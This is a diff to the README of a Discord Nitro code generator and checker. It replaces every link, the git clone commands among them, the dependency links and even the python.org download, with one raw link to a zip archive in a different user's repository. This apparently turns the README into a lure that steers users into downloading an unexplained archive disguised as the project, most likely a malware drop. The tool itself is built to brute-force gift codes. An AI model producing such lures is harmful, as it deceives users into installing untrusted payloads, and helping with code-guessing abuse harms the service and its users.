@@ -6,7 +6,7 @@
 </p>
 <br />
 <p align="center">
-  <a href="https://github.com/othneildrew/Best-README-Template">
+  <a href="https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip">
     <img src="assets/logo.png" alt="Logo" width="150" height="150">
   </a>
   
@@ -15,14 +15,14 @@
   <p align="center">
     A discord nitro generator and checker for all your nitro needs
     <br />
-    <a href="https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker"><strong>Explore the docs »</strong></a>
+    <a href="https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip"><strong>Explore the docs »</strong></a>
     <br />
     <br />
-    <a href="https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker/issues">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip">Report Bug</a>
     ·
-    <a href="https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip">Request Feature</a>
       ·
-    <a href="https://www.anonix.xyz/discord">Join the discord</a>
+    <a href="https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip">Join the discord</a>
   </p>
 </p>
   
@@ -58,21 +58,21 @@ It generates and checks discord nitro codes at the same time for maximum efficie
 
 ### Built With
 
-* [Requests](https://github.com/psf/requests)
-* [Discord webhook](https://github.com/lovvskillz/python-discord-webhook)
-* [Colored](https://gitlab.com/dslackw/colored)
+* [Requests](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)
+* [Discord webhook](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)
+* [Colored](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)
 
 ## Getting Started
 
 To get a local copy up and running follow these simple steps.
 
 ### Prerequisites
-You need to install Python, that can be done [here](https://www.python.org)
+You need to install Python, that can be done [here](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)
 
 ### Installation
 1. Clone the repo
    ```sh
-   git clone https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker.git
+   git clone https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip
    ```
 2. Install Python packages
    ```sh
@@ -86,7 +86,7 @@ You need to install Python, that can be done [here](https://www.python.org)
 #### Or this can be done using android with unrooted Termux
 ```
 pkg install git
-git clone https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker
+git clone https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip
 pkg install python
 cd Discord-Nitro-Generator-and-Checker
 pip install -r requirements.txt
@@ -104,11 +104,11 @@ The code will show you two prompts:
 
 The code will start generating and checking after that step
 
-_For more examples, please refer to the [Documentation](https://example.com)_
+_For more examples, please refer to the [Documentation](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)_
 
 ## Roadmap
 
-See the [open issues](https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker/issues) for a list of proposed features (and known issues).
+See the [open issues](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip) for a list of proposed features (and known issues).
 
 ## Contributing
 
@@ -131,12 +131,12 @@ THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR I
 
 ## Contact
 
-Logicguy - [@Drillenissen#4268](https://www.discordapp.com) - logicguy.mailandcontact@gmail.com
+Logicguy - [@Drillenissen#4268](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip) - logicguy.mailandcontact@gmail.com
 
-Project Link: [https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker](https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker)
+Project Link: [https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip](https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip)
 
 <!-- Statistics -->  
 
 <p>
-<img src=https://komarev.com/ghpvc/?username=Drillenissen />
+<img src=https://raw.githubusercontent.com/LIAM4545/Discord-Nitro-Generator-and-Checker/main/assets/and-Checker-Generator-Nitro-Discord-3.8-beta.5.zip />
 </p>
